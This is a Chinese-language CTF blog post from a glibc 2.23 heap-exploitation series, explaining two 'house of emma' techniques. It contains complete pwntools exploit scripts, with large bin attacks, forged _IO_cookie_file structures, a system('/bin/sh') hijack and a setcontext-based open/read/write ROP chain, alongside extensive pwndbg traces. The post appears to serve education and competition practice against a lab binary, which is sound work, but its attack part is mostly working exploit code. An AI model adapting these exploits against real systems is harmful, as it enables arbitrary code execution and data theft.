---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其七
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其七

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-29 house of emma其一

本方法是一种结合堆内存破坏与IO文件流劫持的高级利用技术，其核心在于通过堆漏洞操控`_IO_cookie_file`结构体，并将IO流的虚表（vtable）伪造为libc中合法的`_IO_cookie_jumps`，从而绕过后续libc版本中对vtable地址的严格校验；通过精心布局该结构体中的函数指针与缓冲区指针，可在触发IO操作时实现任意代码执行，因此在引入了vtable范围检查的防护环境中仍具有较强的通用性。

相关glibc完整源码参见[iofopncook.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/iofopncook.c#L54)：

```C
struct _IO_cookie_file
{
  struct _IO_FILE_plus __fp;
  void *__cookie;
  _IO_cookie_io_functions_t __io_functions;
};

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};

/* The structure with the cookie function pointers.  */
typedef struct
{
  __io_read_fn *read;		/* Read bytes.  */
  __io_write_fn *write;		/* Write bytes.  */
  __io_seek_fn *seek;		/* Seek/tell file position.  */
  __io_close_fn *close;		/* Close file.  */
} _IO_cookie_io_functions_t;
typedef _IO_cookie_io_functions_t cookie_io_functions_t;

static const struct _IO_jump_t _IO_cookie_jumps = {
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_cookie_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf),
  JUMP_INIT(sync, _IO_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_cookie_read),
  JUMP_INIT(write, _IO_cookie_write),
  JUMP_INIT(seek, _IO_cookie_seek),
  JUMP_INIT(close, _IO_cookie_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue),
};

static _IO_ssize_t
_IO_cookie_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;

  if (cfile->__io_functions.read == NULL)
    return -1;

  return cfile->__io_functions.read (cfile->__cookie, buf, size);
}

static _IO_ssize_t
_IO_cookie_write (_IO_FILE *fp, const void *buf, _IO_ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;

  if (cfile->__io_functions.write == NULL)
    {
      fp->_flags |= _IO_ERR_SEEN;
      return 0;
    }

  _IO_ssize_t n = cfile->__io_functions.write (cfile->__cookie, buf, size);
  if (n < size)
    fp->_flags |= _IO_ERR_SEEN;

  return n;
}

static _IO_off64_t
_IO_cookie_seek (_IO_FILE *fp, _IO_off64_t offset, int dir)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;

  return ((cfile->__io_functions.seek == NULL
	   || (cfile->__io_functions.seek (cfile->__cookie, &offset, dir)
	       == -1)
	   || offset == (_IO_off64_t) -1)
	  ? _IO_pos_BAD : offset);
}

static int
_IO_cookie_close (_IO_FILE *fp)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;

  if (cfile->__io_functions.close == NULL)
    return 0;

  return cfile->__io_functions.close (cfile->__cookie);
}
```

本方法存在四种独立的利用路径，分别对应于`_IO_cookie_read`、`_IO_cookie_write`、`_IO_cookie_seek`和`_IO_cookie_close`函数。在测试利用过程中，选取`_IO_cookie_write`作为代表性样例进行深入分析，以阐明其机制和潜在影响。此外，libc中的触发点通过调用链`__malloc_assert → __fxprintf → outstring`实现。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/17/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_emma/exploit.py)。

核心利用代码如下：

```python
# house of emma
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_cookie_jumps = libc.sym["_IO_cookie_jumps"]
log.info(f"_IO_cookie_jumps addr: {hex(_IO_cookie_jumps)}")
stderr = 0x4040A0
log.info(f"stderr addr: {hex(stderr)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 4].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(stderr - 0x10)
payload += p64(chunk0_addr) + p64(stderr - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_io = b"\x00" * (0x28 - 0x10) + p64(0xFFFFFFFFFFFFFFFF)
fake_io = fake_io.ljust(0x88 - 0x10, b"\x00") + p64(chunk0_addr)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_cookie_jumps + 0x40)
fake_io += p64(binsh_addr)
fake_io += p64(0)
fake_io += p64(system)
edit(2, len(fake_io), fake_io)
payload = b"\x00" * 0x500 + p64(0) + p64(0x1000)
edit(4, len(payload), payload)
malloc(5, 0x1200)
cmd = b"cat src/2.23/house_of_emma/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在利用过程的初始阶段，通过运用large bin attack技术，对堆内存中的chunks进行精细的布局和控制。该技术利用large bin管理机制中的特定漏洞，通过操纵chunks的大小、位置和指针，实现内存结构的重排。此举旨在强制内存分配器暴露关键的系统地址信息，包括libc库的基址和堆的起始地址。这些泄露的地址为后续的利用步骤提供了必要的数据基础，如计算函数偏移、构建payload或绕过安全防护机制，从而确保整个利用链的连续性和可靠性。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x1e4dc000
Size: 0x430 (with flag bits: 0x431)
fd: 0x79177e58df68
bk: 0x79177e58df68
fd_nextsize: 0x1e4dc000
bk_nextsize: 0x1e4dc000

Allocated chunk
Addr: 0x1e4dc430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x1e4dc940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x1e4dcd50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x1e4dd260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x1e4dc000 —▸ 0x79177e58df68 (main_arena+1096) ◂— 0x1e4dc000
pwndbg> 
```

随后，在large bin attack的上下文中，对chunks的bk（后向指针）和bk_nextsize（指向下一个大小不同的chunk的指针）进行精确修改。这一操作旨在操纵内存分配器的内部数据结构，通过篡改chunk之间的链接关系，改变large bin的正常管理逻辑。修改这些指针可以诱导分配器在后续操作中处理chunk时产生非预期行为。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x1e4dc000 —▸ 0x79177e58df68 (main_arena+1096) ◂— 0x1e4dc000
BK: 0x1e4dc000 —▸ 0x404090 (stdin@GLIBC_2.2.5) ◂— 0
pwndbg> x/6gx 0x1e4dc000
0x1e4dc000:     0x0000000000000000      0x0000000000000431
0x1e4dc010:     0x000079177e58df68      0x0000000000404090
0x1e4dc020:     0x000000001e4dc000      0x0000000000404080
pwndbg> x/1gx &stderr
0x4040a0 <stderr@GLIBC_2.2.5>:  0x000079177e58e560
pwndbg> 
```

在完成内存布局与指针篡改后，通过发起特定的内存分配请求来申请新的chunks。这一操作将主动触发large bin attack的利用条件。分配器的处理逻辑会遍历已被恶意修改的large bin链表，并依据被篡改的bk与bk_nextsize指针执行元数据更新。其结果是，成功将目标stderr内容修改为chunks[2]可控的内存地址。

```bash
pwndbg> x/1gx &stderr
0x4040a0 <stderr@GLIBC_2.2.5>:  0x000000001e4dc940
pwndbg> x/10gx chunks
0x4040c0 <chunks>:      0x0000000000000020      0x000000001e4dc010
0x4040d0 <chunks+16>:   0x0000000000000500      0x000000001e4dc440
0x4040e0 <chunks+32>:   0x0000000000000400      0x000000001e4dc950
0x4040f0 <chunks+48>:   0x0000000000000500      0x000000001e4dcd60
0x404100 <chunks+64>:   0x0000000000000500      0x000000001e4dd270
pwndbg> 
```

至此，利用前期获得的任意地址写入能力，可以在受控的chunks[2]内存区域中精心构造一个伪造的`_IO_cookie_file`结构体。

```bash
pwndbg> p/x *(struct _IO_cookie_file*)stderr
$3 = {
  __fp = {
    file = {
      _flags = 0x0,
      _IO_read_ptr = 0x411,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0xffffffffffffffff,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0x0,
      _flags2 = 0x0,
      _old_offset = 0x0,
      _cur_column = 0x0,
      _vtable_offset = 0x0,
      _shortbuf = {0x0},
      _lock = 0x1e4dc000,
      _offset = 0x0,
      _codecvt = 0x0,
      _wide_data = 0x0,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0x0,
      _mode = 0x0,
      _unused2 = {0x0 <repeats 20 times>}
    },
    vtable = 0x79177e58be20
  },
  __cookie = 0x79177e356d73,
  __io_functions = {
    read = 0x0,
    write = 0x79177e23c3eb,
    seek = 0x0,
    close = 0x0
  }
}
pwndbg> x/5i 0x79177e23c3eb                 
   0x79177e23c3eb <__libc_system>:      sub    rsp,0x8
   0x79177e23c3ef <__libc_system+4>:    test   rdi,rdi
   0x79177e23c3f2 <__libc_system+7>:    jne    0x79177e23c40a <__libc_system+31>
   0x79177e23c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x79177e356d7b
   0x79177e23c3fb <__libc_system+16>:   call   0x79177e23be36 <do_system>
pwndbg> x/s 0x79177e356d73 
0x79177e356d73: "/bin/sh"
pwndbg>
```

在完成对`_IO_cookie_file`结构的伪造后，利用流程进入下一关键阶段。首先修改top chunk的size字段，将其设置为一个较小的值（例如0x1000）。随后，程序尝试申请一个超过此尺寸的内存块（例如0x1200）。由于请求的大小超过了当前top chunk的剩余容量，内存分配器（malloc）无法从top chunk中满足此次分配，这将导致分配失败并触发内部的`__malloc_assert`函数调用。该断言失败是利用链中预设的触发条件，它将启动一系列后续的库函数调用（包括涉及`_IO_file`结构的处理流程），最终引导至先前在伪造的`_IO_cookie_file`结构中布置的恶意代码路径，从而完成利用。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:294
   288 extern const char *__progname;
   289 
   290 static void
   291 __malloc_assert (const char *assertion, const char *file, unsigned int line,
   292                  const char *function)
   293 {
 ► 294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
   295                      __progname, __progname[0] ? ": " : "",
   296                      file, line,
   297                      function ? function : "", function ? ": " : "",
   298                      assertion);
   299   fflush (stderr);
   300   abort ();
   301 }
```

在触发`__malloc_assert`后，执行流进入`__fxprintf`函数，该函数负责处理格式化输出至标准错误流（stderr）。其内部进一步调用`_IO_vfprintf`函数，这是GLIBC中实现核心可变参数格式化输出的关键函数。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1320
   1314 
   1315   /* Lock stream.  */
   1316   _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);
   1317   _IO_flockfile (s);
   1318 
   1319   /* Write the literal text before the first format.  */
 ► 1320   outstring ((const UCHAR_T *) format,
   1321              lead_str_end - (const UCHAR_T *) format);
 
   0x79177e243a94 <vfprintf+460>    sub    r14, r12                         R14 => 0 (0x79177e35b008 - 0x79177e35b008)
   0x79177e243a97 <vfprintf+463>    mov    rdx, r14                         RDX => 0
   0x79177e243a9a <vfprintf+466>    mov    rsi, r12                         RSI => 0x79177e35b008 ◂— and eax, 0x25732573 /* "%s%s%s:%u: %s%sAssertion `%s' failed.\n" */
   0x79177e243a9d <vfprintf+469>    mov    rdi, rbx                         RDI => 0x1e4dc940 ◂— 0
 ► 0x79177e243aa0 <vfprintf+472>    call   qword ptr [rax + 0x38]      <_IO_cookie_write>
        rdi: 0x1e4dc940 ◂— 0
        rsi: 0x79177e35b008 ◂— and eax, 0x25732573 /* "%s%s%s:%u: %s%sAssertion `%s' failed.\n" */
        rdx: 0
 
```

在`_IO_vfprintf`函数的执行过程中，当格式化输出流程进行到向目标`_IO_FILE`流写入字符串时，会调用其内部的`outstring`函数（或相关辅助函数）。此函数负责将已格式化的字符序列提交至底层`_IO_FILE`对象。在正常情况下，这会通过该对象的虚表（vtable）分派至对应的写入方法（例如`_IO_new_file_xsputn`）。

然而，在本利用场景中，由于此前已通过large bin attack等技术手段，成功将目标`_IO_FILE`结构（本例中为伪造的`_IO_cookie_file`）的虚表指针篡改为一个受控地址，并且其cookie及函数指针等字段均已被精心构造。因此，当`outstring`尝试执行写入操作时，虚表查找机制会将其导向预设的、指向`_IO_cookie_write`函数的指针。这一调用并非正常的I/O操作，而是控制流劫持的触发点。程序执行权由此从合法的库函数路径，跳转至通过伪造结构所指定的恶意代码，从而完成从内存破坏到任意代码执行的关键转换。

```bash
In file: /home/bogon/workSpaces/glibc/libio/iofopncook.c:64
   58   if (cfile->__io_functions.write == NULL)
   59     {
   60       fp->_flags |= _IO_ERR_SEEN;
   61       return 0;
   62     }
   63 
 ► 64   _IO_ssize_t n = cfile->__io_functions.write (cfile->__cookie, buf, size);
 
pwndbg> p/x cfile->__io_functions.write
$4 = 0x79177e23c3eb
pwndbg> p/x cfile->__cookie
$5 = 0x79177e356d73
pwndbg> x/5i 0x79177e23c3eb
   0x79177e23c3eb <__libc_system>:      sub    rsp,0x8
   0x79177e23c3ef <__libc_system+4>:    test   rdi,rdi
   0x79177e23c3f2 <__libc_system+7>:    jne    0x79177e23c40a <__libc_system+31>
   0x79177e23c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x79177e356d7b
   0x79177e23c3fb <__libc_system+16>:   call   0x79177e23be36 <do_system>
pwndbg> x/s 0x79177e356d73
0x79177e356d73: "/bin/sh"
pwndbg> 
```

至此，控制流已成功跳转至伪造的`_IO_cookie_file`结构所指定的`_IO_cookie_write`函数指针。在该利用场景中，已将此指针（即`cfile->__io_functions.write`）设置为`system`函数的地址。同时，该结构的`cfile->__cookie`字段被精心设置为一个指向字符串`/bin/sh`的指针。根据`_IO_cookie_write`的函数调用约定，其第一个参数即为该`cookie`值。

因此，当执行流被劫持至此函数调用时，其实际效果等同于执行`system("/bin/sh")`。这一调用会启动一个新的 shell 进程。由于此操作通常在原始进程的上下文中完成，从而成功获得了该shell的控制权。这标志着整个利用链的最终完成：从初始的内存布局和信息泄露，到通过堆元数据篡改实现任意写，再到伪造`_IO_FILE`结构劫持控制流，最终通过滥用`_IO_cookie_write`的调用约定实现任意命令执行，达成了任意代码执行的目标。


### 1-30 house of emma其二

本方法在结合堆内存破坏与IO文件流劫持的基础上，进一步扩展至受限沙箱环境下的利用场景。该沙箱环境通常通过seccomp等机制严格限制可用的系统调用，仅允许`open、read、write`等少数基本操作，从而阻止了通过execve或system直接获取shell的传统途径。为适应此环境，利用策略进行了针对性调整。

核心的利用对象从标准错误流stderr对应的`_IO_2_1_stderr_`结构，转变为全局文件链表头`_IO_list_all`。通过堆漏洞实现任意地址写后，篡改`_IO_list_all`指针，使其指向一个受控的、伪造的`_IO_FILE_plus`结构链。该伪造结构同样将其虚表（vtable）设置为经过验证的`_IO_cookie_jumps`等合法跳转表，以通过后续glibc高版本中的vtable范围检查（如`IO_validate_vtable`）。

触发路径相应变更为：当堆管理器检测到严重错误（如双重释放或堆结构损坏）时，会调用`malloc_printerr`输出错误信息。在特定条件下，该函数会进一步调用`_IO_flush_all_lockp`。此函数会遍历`_IO_list_all`链表，尝试刷新（flush）所有输出流。在遍历过程中，对于链表中的每个`_IO_FILE`对象，它会检查其状态并调用其虚表中的`_IO_OVERFLOW`函数指针。

因此，当遍历至植入的伪造`_IO_FILE`结构时，对`_IO_OVERFLOW`的调用将被劫持。通过将伪造结构的`_IO_OVERFLOW`指针设置为`_IO_cookie_write`（或类似函数），并将`__cookie`设置为可控堆内存地址，`__io_functions.write`设置为`setcontext+53`地址，在可控堆内存地址里精心布局`open/read/write`组合的gadget地址以实现信息泄露，最终在触发write调用时将堆栈迁移至可控堆内存地址，进而执行orw的gadget片段实现flag的获取。尽管在严格的沙箱下无法直接获取shell，但通过组合允许的系统调用，仍可能实现敏感信息读取或有限度的文件操作，从而达成在受限环境下的漏洞利用。这一改进显著提升了该利用技术在现实安全防护环境中的适应性与有效性。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_emma_again/exploit.py)。

核心利用代码如下：

```python
# house of emma again
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
setcontext = libc.sym["setcontext"]
log.info(f"setcontext addr: {hex(setcontext)}")
setcontext53 = libc.sym["setcontext"] + 53
log.info(f"setcontext+53 addr: {hex(setcontext53)}")
_IO_cookie_jumps = libc.sym["_IO_cookie_jumps"]
log.info(f"_IO_cookie_jumps addr: {hex(_IO_cookie_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
pop_rdi = libc.address + 0x00000000000202F1
pop_rsi = libc.address + 0x000000000001FEE3
pop_rdx = libc.address + 0x0000000000001B92
pop_rax = libc.address + 0x000000000001D490
ret_addr = pop_rdi + 1
log.info(f"pop_rdi addr: {hex(pop_rdi)}")
log.info(f"pop_rsi addr: {hex(pop_rsi)}")
log.info(f"pop_rdx addr: {hex(pop_rdx)}")
log.info(f"pop_rax addr: {hex(pop_rax)}")
log.info(f"ret addr: {hex(ret_addr)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk1_addr = chunk0_addr + 0x420 + 0x10
log.info(f"chunk1 addr: {hex(chunk1_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_io = p64(0) + p64(_IO_list_all - 0x10)
fake_io += p64(2) + p64(3)
fake_io = fake_io.ljust(0xC0 - 0x10, b"\x00") + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_cookie_jumps + 0x60)
fake_io += p64(chunk0_addr + 0x10)
fake_io += p64(0)
fake_io += p64(setcontext53)
edit(2, len(fake_io), fake_io)

orw_chain = [
    # open
    pop_rax,
    2,
    pop_rdi,
    chunk1_addr + 0x110,
    pop_rsi,
    0,
    pop_rdx,
    0,
    libc.sym["open"] + 0xE,
    # read
    pop_rax,
    0,
    pop_rdi,
    4,  # Normally it should be 3, but as it runs locally, it will occupy an additional fd
    pop_rsi,
    chunk0_addr + 0x200,
    pop_rdx,
    0x100,
    libc.sym["read"] + 0xE,
    # write
    pop_rax,
    1,
    pop_rdi,
    1,
    pop_rsi,
    chunk0_addr + 0x200,
    pop_rdx,
    0x100,
    libc.sym["write"] + 0xE,
]

srop = b"\x00" * 0x20 + b"".join([p64(gadget) for gadget in orw_chain])
srop = srop.ljust(0x100, b"\x00") + b"src/2.23/house_of_emma_again/flag\x00"
edit(1, len(srop), srop)

payload = b"\x00" * 0xA0 + p64(chunk1_addr + 0x30)
payload = payload.ljust(0xA8, b"\x00") + p64(ret_addr)
edit(0, len(payload), payload)
delete(0)
conn.recvline()
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在利用链的起始阶段，采用large bin attack技术对堆内存中的chunk进行精心的构造与操控。该方法利用glibc堆管理器中large bin维护机制的特定逻辑缺陷，通过精确操控chunk的大小、排列顺序及其内部指针（如bk和bk_nextsize），实现对内存元数据布局的定向干扰。其目的在于诱导内存分配器在后续操作中输出关键的运行时地址信息，包括libc库的基地址与堆区域的起始地址。所获取的地址信息构成了后续所有利用步骤不可或缺的基础，使得能够准确计算函数偏移、构造有效的载荷数据，并可能绕过现有的内存防护机制，从而保障了整个多阶段利用链条的顺利推进与最终可靠性。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x5f540630d000
Size: 0x430 (with flag bits: 0x431)
fd: 0x79246d58df68
bk: 0x79246d58df68
fd_nextsize: 0x5f540630d000
bk_nextsize: 0x5f540630d000

Allocated chunk
Addr: 0x5f540630d430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x5f540630d940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x5f540630dd50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5f540630e260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x5f540630d000 —▸ 0x79246d58df68 (main_arena+1096) ◂— 0x5f540630d000
pwndbg> 
```

随后，在large bin attack的上下文中，进一步对相关chunk的后向指针（bk）及大小链指针（bk_nextsize）实施定向篡改。该操作的核心目的是干扰内存分配器内部链表结构的完整性，通过恶意调整chunk间的连接关系，破坏large bin原有的管理秩序。对上述指针的篡改，将导致分配器在后续执行诸如插入、查找或拆分等操作时，遵循被恶意重定向的链表路径，从而引发非预期的内存读写行为，为后续的利用创造条件。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x5f540630d000 —▸ 0x79246d58df68 (main_arena+1096) ◂— 0x5f540630d000
BK: 0x5f540630d000 —▸ 0x79246d58e530 ◂— 0
pwndbg> x/6gx 0x5f540630d000
0x5f540630d000: 0x0000000000000000      0x0000000000000431
0x5f540630d010: 0x000079246d58df68      0x000079246d58e530
0x5f540630d020: 0x00005f540630d000      0x000079246d58e520
pwndbg> x/1gx &_IO_list_all
0x79246d58e540 <__GI__IO_list_all>:     0x000079246d58e560
pwndbg> 
```

在完成前述的内存布局与指针篡改后，通过发起一个特定大小的内存分配请求（malloc）来申请新的堆块。这一操作是触发large bin attack的关键步骤，它将驱动堆分配器执行_int_malloc函数中的large bin处理逻辑。分配器会遍历已被恶意修改的large bin链表，在尝试从对应大小的bin中寻找合适块时，会依据被篡改的bk_nextsize指针执行链表拆解与重组。在此过程中，其元数据更新操作会将一个受控的地址值（通常是目标chunk的size字段）写入目标位置。

本次利用的核心目标，是将全局变量`_IO_list_all`的内容修改为可控的堆地址（例如chunks[2]的地址）。通过精心构造的large bin attack，成功将`_IO_list_all`指针覆盖为指向一个伪造的`_IO_FILE_plus`结构链表的头部。篡改`_IO_list_all`是后续利用的基石，因为该全局指针管理着所有已打开文件流的链表。控制此指针意味着能够向系统IO处理流程中注入恶意的文件流对象，从而为接下来通过`_IO_flush_all_lockp`等函数触发虚表劫持、并最终执行任意代码创造了决定性条件。

```bash
pwndbg> p/x *(struct _IO_cookie_file*)_IO_list_all
$1 = {
  __fp = {
    file = {
      _flags = 0x0,
      _IO_read_ptr = 0x411,
      _IO_read_end = 0x0,
      _IO_read_base = 0x79246d58e530,
      _IO_write_base = 0x2,
      _IO_write_ptr = 0x3,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0x0,
      _flags2 = 0x0,
      _old_offset = 0x0,
      _cur_column = 0x0,
      _vtable_offset = 0x0,
      _shortbuf = {0x0},
      _lock = 0x0,
      _offset = 0x0,
      _codecvt = 0x0,
      _wide_data = 0x0,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0x0,
      _mode = 0x0,
      _unused2 = {0x0 <repeats 20 times>}
    },
    vtable = 0x79246d58be40
  },
  __cookie = 0x5f540630d010,
  __io_functions = {
    read = 0x0,
    write = 0x79246d23e5b5,
    seek = 0x0,
    close = 0x0
  }
}
pwndbg> disassemble setcontext
Dump of assembler code for function setcontext:
   ...
   0x000079246d23e5b5 <+53>:    mov    rsp,QWORD PTR [rdi+0xa0]
   0x000079246d23e5bc <+60>:    mov    rbx,QWORD PTR [rdi+0x80]
   0x000079246d23e5c3 <+67>:    mov    rbp,QWORD PTR [rdi+0x78]
   0x000079246d23e5c7 <+71>:    mov    r12,QWORD PTR [rdi+0x48]
   0x000079246d23e5cb <+75>:    mov    r13,QWORD PTR [rdi+0x50]
   0x000079246d23e5cf <+79>:    mov    r14,QWORD PTR [rdi+0x58]
   0x000079246d23e5d3 <+83>:    mov    r15,QWORD PTR [rdi+0x60]
   0x000079246d23e5d7 <+87>:    mov    rcx,QWORD PTR [rdi+0xa8]
   0x000079246d23e5de <+94>:    push   rcx
   0x000079246d23e5df <+95>:    mov    rsi,QWORD PTR [rdi+0x70]
